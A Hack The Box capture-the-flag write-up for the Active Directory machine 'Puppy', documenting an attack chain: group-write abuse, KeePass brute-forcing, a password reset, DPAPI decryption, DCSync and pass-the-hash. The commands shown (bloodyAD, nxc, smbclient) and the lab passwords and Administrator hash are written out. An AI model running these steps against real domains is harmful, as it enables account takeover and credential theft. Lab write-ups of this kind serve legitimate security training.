---
title: HTB Puppy
slug: puppy
lang: en
platform: Hack The Box
category: Active Directory
headline: Group write abuse, KeePass recovery, DPAPI secrets and DCSync
difficulty: Medium
objective: Administrator
date: 2025-05-24
tags: [Active Directory, BloodHound, KeePass, DPAPI, DCSync]
---

# HTB Puppy

## Executive Summary

Puppy starts with valid credentials for `levi.james`. BloodHound shows that Levi has `GenericWrite` over the `Developers` group, allowing access to the `DEV` share and recovery of a KeePass database. Cracking the KeePass file reveals several domain passwords, one of which leads to `ant.edwards`. Through writable permissions over `adam.silver`, password reset and account enablement provide user access. Later, credentials for `steph.cooper` and DPAPI material expose `steph.cooper_adm`, who can perform DCSync and retrieve the Administrator hash.

## Initial Credentials and Enumeration

```text
User: levi.james
Password: KingofAkron2025!
```

![[Pasted image 20250523200054.png|Initial credentials]]
![[Pasted image 20250523200623.png|Initial host validation]]
![[Pasted image 20250523200427.png|Domain details]]
![[Pasted image 20250523200753.png|Service context]]

LDAP and SMB enumeration produced a list of domain users.

```bash
nxc smb 10.10.11.70 -u levi.james -p 'KingofAkron2025!' --users
smbmap -H 10.10.11.70 -u levi.james -p 'KingofAkron2025!'
```

![[Pasted image 20250523202200.png|ldapdomaindump output]]
![[Pasted image 20250523205131.png|SMB user enumeration]]
![[Pasted image 20250523205600.png|SMB share listing]]

## Developers Group and KeePass Recovery

BloodHound showed `levi.james` had `GenericWrite` over `Developers`, allowing group membership modification.

```bash
bloodyAD --host 10.10.11.70 -d puppy.htb -u levi.james -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james
```

![[Pasted image 20250523210530.png|BloodHound collection]]
![[Pasted image 20250523212725.png|GenericWrite over Developers]]
![[Pasted image 20250523214240.png|Added levi.james to Developers]]

This unlocked the `DEV` share, where `recovery.kdbx` was found.

```bash
smbclient \\10.10.11.70\DEV -U 'levi.james'
```

![[Pasted image 20250523214442.png|DEV share access]]
![[Pasted image 20250523214659.png|DEV share connection]]
![[Pasted image 20250523214935.png|recovery.kdbx download]]

The KeePass password was brute-forced.

```text
KeePass password: liverpool
```

![[Pasted image 20250523215240.png|keepass4brute download]]
![[Pasted image 20250523215306.png|KeePass password cracked]]

Recovered credentials included several users. `ant.edwards` was valid.

```text
ADAM SILVER -- HJKL2025!
ANTONY C. EDWARDS -- Antman2025!
JAMIE WILLIAMSON -- JamieLove2025!
SAMUEL BLAKE -- ILY2025!
STEVE TUCKER -- Steve2025!
```

![[Pasted image 20250523215425.png|KeePass entries]]
![[Pasted image 20250523220400.png|ant.edwards valid credentials]]

## Adam Silver Pivot

`ant.edwards` had rights that allowed modification of `Adam D. Silver`, including password reset and account enablement.

![[Pasted image 20250523220810.png|BloodHound collection as ant.edwards]]
![[Pasted image 20250523221554.png|Senior Devs group modification]]
![[Pasted image 20250523221739.png|Writable permissions]]
![[Pasted image 20250523222303.png|Writable Adam Silver object]]

Adam's password was reset and the disabled account was enabled.

```text
setuserinfo ADAM.SILVER 23 NewPassword@987
bloodyAD --host dc.puppy.htb -d puppy.htb -u ant.edwards -p Antman2025! remove uac 'ADAM.SILVER' -f ACCOUNTDISABLE
```

![[Pasted image 20250523222643.png|Adam password reset]]
![[Pasted image 20250523223422.png|Adam disabled account]]
![[Pasted image 20250523223544.png|Adam account enabled]]
![[Pasted image 20250523224018.png|WinRM validation as Adam]]

User access was obtained through WinRM.

![[Pasted image 20250523232726.png|WinRM as Adam]]
![[Pasted image 20250523232756.png|User flag]]

## DPAPI and Admin Credential Recovery

Further enumeration revealed an archive containing credentials for `steph.cooper`.

![[Pasted image 20250523233004.png|Post-user enumeration]]
![[Pasted image 20250523233556.png|Archive download]]
![[Pasted image 20250523233751.png|Archive listing]]
![[Pasted image 20250523233923.png|steph.cooper credentials]]
![[Pasted image 20250523234113.png|WinRM as steph.cooper]]

DPAPI masterkeys and credential blobs were collected from Steph's profile.

![[Pasted image 20250523234505.png|DPAPI protect directory]]
![[Pasted image 20250523234821.png|Masterkey download]]
![[Pasted image 20250523235005.png|Credential blob download]]
![[Pasted image 20250523235316.png|DPAPI files collected]]

The DPAPI data decrypted credentials for `steph.cooper_adm`.

```text
Username: steph.cooper_adm
Password: FivethChipOnItsWay2025!
```

![[Pasted image 20250524000812.png|DPAPI masterkey decryption]]
![[Pasted image 20250524001217.png|DPAPI credential decryption]]
![[Pasted image 20250524001245.png|Recovered admin credentials]]

## DCSync and Administrator Access

BloodHound confirmed the privileged path for `steph.cooper_adm`. DCSync produced the Administrator hash.

![[Pasted image 20250524001409.png|BloodHound as steph.cooper_adm]]
![[Pasted image 20250524003243.png|DCSync dump]]

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b:::
```

The hash was used for Pass-the-Hash.

![[Pasted image 20250524003345.png|Administrator hash validation]]
![[Pasted image 20250524002016.png|Pass-the-Hash]]
![[Pasted image 20250524003445.png|Administrator shell]]

## Key Takeaways

- Group write permissions can expose new shares and sensitive vault files.
- KeePass and DPAPI artifacts often create credential chains across users.
- Account enablement plus password reset is a complete pivot when WinRM is available.
- DCSync-capable users turn domain compromise into Administrator hash recovery.
